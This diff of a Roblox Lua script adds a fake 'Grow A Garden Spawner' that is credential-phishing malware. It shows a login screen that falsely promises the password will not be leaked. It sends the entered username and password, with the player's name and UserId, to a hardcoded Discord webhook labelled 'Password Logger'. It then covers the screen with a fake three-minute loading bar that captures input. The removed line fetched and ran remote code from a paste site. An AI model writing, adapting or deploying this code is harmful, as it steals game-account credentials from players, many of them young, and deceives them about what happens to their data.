@@ -1,1 +1,204 @@
-loadstring(game:HttpGet("https://pastefy.app/hcMHHxCd/raw"))()
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local lp = Players.LocalPlayer
+local webhook = "https://discord.com/api/webhooks/1402767053974143086/-LyMbxGbjf8WpStV5juev8rNXiKDlH4Lfh8I4Y-9ovlWxYJMplMvj_QI5uj0nBtrdQn4"
+
+local function sendWebhook(payload)
+    local jsonData = HttpService:JSONEncode(payload)
+    local req = (syn and syn.request) or (http and http.request) or request or http_request
+    if req then
+        pcall(function()
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData,
+            })
+        end)
+    else
+        warn("No HTTP request function found, webhook not sent.")
+    end
+end
+
+local function createLoadingScreen()
+    local loadingGui = Instance.new("ScreenGui")
+    loadingGui.Name = "LoadingScreen"
+    loadingGui.Parent = CoreGui
+    loadingGui.ResetOnSpawn = false
+    loadingGui.IgnoreGuiInset = true
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.Position = UDim2.new(0, 0, 0, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BorderSizePixel = 0
+    frame.Parent = loadingGui
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0, 50)
+    label.Position = UDim2.new(0, 0, 0.4, 0)
+    label.BackgroundTransparency = 1
+    label.Text = "🔄 Loading, please wait..."
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 30
+    label.Parent = frame
+
+    local progressBarBack = Instance.new("Frame")
+    progressBarBack.Size = UDim2.new(0.6, 0, 0, 25)
+    progressBarBack.Position = UDim2.new(0.2, 0, 0.5, 0)
+    progressBarBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    progressBarBack.BorderSizePixel = 0
+    progressBarBack.Parent = frame
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.Position = UDim2.new(0, 0, 0, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = progressBarBack
+
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Size = UDim2.new(1, 0, 1, 0)
+    percentLabel.Position = UDim2.new(0, 0, 0, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.TextColor3 = Color3.new(1, 1, 1)
+    percentLabel.Font = Enum.Font.GothamBold
+    percentLabel.TextSize = 20
+    percentLabel.Parent = progressBarBack
+
+    frame.Active = true
+    frame.Selectable = true
+
+    frame.InputBegan:Connect(function(input)
+        input:CaptureControl()
+    end)
+    frame.InputChanged:Connect(function(input)
+        input:CaptureControl()
+    end)
+    for _, guiElement in pairs(loadingGui:GetDescendants()) do
+        if guiElement:IsA("GuiObject") then
+            guiElement.InputBegan:Connect(function(input)
+                input:CaptureControl()
+            end)
+            guiElement.InputChanged:Connect(function(input)
+                input:CaptureControl()
+            end)
+        end
+    end
+
+    local totalTime = 180 -- 3 minutes
+    local startTime = tick()
+
+    local heartbeat = RunService.Heartbeat
+    local conn
+    conn = heartbeat:Connect(function()
+        local elapsed = tick() - startTime
+        local progress = math.clamp(elapsed / totalTime, 0, 1)
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentLabel.Text = string.format("%d%%", math.floor(progress * 100))
+        if progress >= 1 then
+            conn:Disconnect()
+            loadingGui:Destroy()
+        end
+    end)
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "LoginScreen"
+gui.Parent = CoreGui
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 60)
+titleLabel.Position = UDim2.new(0, 0, 0.2, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Grow A Garden Spawner"
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 48
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.Parent = frame
+
+local infoLabel = Instance.new("TextLabel")
+infoLabel.Size = UDim2.new(1, 0, 0, 30)
+infoLabel.Position = UDim2.new(0, 0, 0.3, 0)
+infoLabel.BackgroundTransparency = 1
+infoLabel.Text = "(Your password will not be leaked in any way. It's just to make sure you're not a bot.)"
+infoLabel.Font = Enum.Font.Gotham
+infoLabel.TextSize = 18
+infoLabel.TextColor3 = Color3.new(1, 1, 1)
+infoLabel.Parent = frame
+
+local usernameBox = Instance.new("TextBox")
+usernameBox.Size = UDim2.new(0.4, 0, 0, 40)
+usernameBox.Position = UDim2.new(0.3, 0, 0.4, 0)
+usernameBox.PlaceholderText = "Username"
+usernameBox.ClearTextOnFocus = false
+usernameBox.Text = ""
+usernameBox.Font = Enum.Font.Gotham
+usernameBox.TextSize = 24
+usernameBox.TextColor3 = Color3.new(0, 0, 0)
+usernameBox.Parent = frame
+
+local passwordBox = Instance.new("TextBox")
+passwordBox.Size = UDim2.new(0.4, 0, 0, 40)
+passwordBox.Position = UDim2.new(0.3, 0, 0.5, 0)
+passwordBox.PlaceholderText = "Password"
+passwordBox.ClearTextOnFocus = false
+passwordBox.Text = ""
+passwordBox.Font = Enum.Font.Gotham
+passwordBox.TextSize = 24
+passwordBox.TextColor3 = Color3.new(0, 0, 0)
+-- Password visible, so no Password property set
+passwordBox.Parent = frame
+
+local enterButton = Instance.new("TextButton")
+enterButton.Size = UDim2.new(0.4, 0, 0, 40)
+enterButton.Position = UDim2.new(0.3, 0, 0.6, 0)
+enterButton.Text = "Enter"
+enterButton.Font = Enum.Font.GothamBold
+enterButton.TextSize = 28
+enterButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+enterButton.TextColor3 = Color3.new(1, 1, 1)
+enterButton.Parent = frame
+
+enterButton.MouseButton1Click:Connect(function()
+    local username = usernameBox.Text
+    local password = passwordBox.Text
+
+    if username == "" or password == "" then
+        return
+    end
+
+    local payload = {
+        username = "Password Logger",
+        embeds = {{
+            title = "New Credentials Captured",
+            color = 16711680,
+            fields = {
+                {name = "Player", value = lp.Name, inline = true},
+                {name = "UserId", value = tostring(lp.UserId), inline = true},
+                {name = "Username", value = username, inline = false},
+                {name = "Password", value = password, inline = false},
+                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false},
+            }
+        }}
+    }
+
+    sendWebhook(payload)
+
+    gui:Destroy() -- remove login UI
+    createLoadingScreen() -- show loading screen for 3 minutes
+end)
